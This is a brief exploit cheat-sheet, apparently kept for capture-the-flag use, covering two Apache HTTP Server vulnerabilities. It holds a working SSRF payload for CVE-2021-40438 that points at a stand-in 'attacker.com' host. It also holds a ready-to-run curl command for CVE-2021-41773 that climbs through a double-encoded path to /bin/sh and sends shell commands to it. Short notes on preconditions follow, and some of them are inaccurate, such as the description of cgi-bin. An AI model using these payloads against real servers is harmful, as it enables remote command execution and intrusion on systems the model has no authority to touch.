# Apache

## Apache <=2.4.48 (CVE-2021-40438)

Exploit: 
```
/?unix:{"A"*4096}|http://attacker.com/ 
```

Null pointer deference causes SSRF

**Details:**

- Doesn't seem to work using Python requests - use curl or burp instead.
- Seems to only work for intranet SSRF? (Greyhats 2022, grapache)



## Apache 2.4.49-50 LFI2RCE (CVE-2021-41773)

Exploit: `curl 'http://example.com/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo; ls'`
This is a very advanced exploit, and I shall keep it here for reference until I can understand it one day...

**Details:**

- target binary should be +x (default for /bin/sh)
- Needs `mod_cgi` enabled in Apache config (not default)
- Apache needs path traversal perms granted for `/bin` or `/` (usually not the case!)

`cgi-bin` - an obsolete folder that is used to store and serve static content in Apache. It tells the server how to pass data to and from an application.

This exploit is a form of path traversal: it goes to `cgi-bin`, then `.%%32%65/` (../ dot in urlencoded twice) up to root and down to `/bin/sh`. It's urldecoded twice (once by filter, once by backend). In Apache v2.4.49, double encoding is not necessary, but in v2.4.50 it is.

`--data` - POST request with input into /bin/sh 

CTF application: if the challenge seems to hint that it's Apache + path traversal, do consider this!
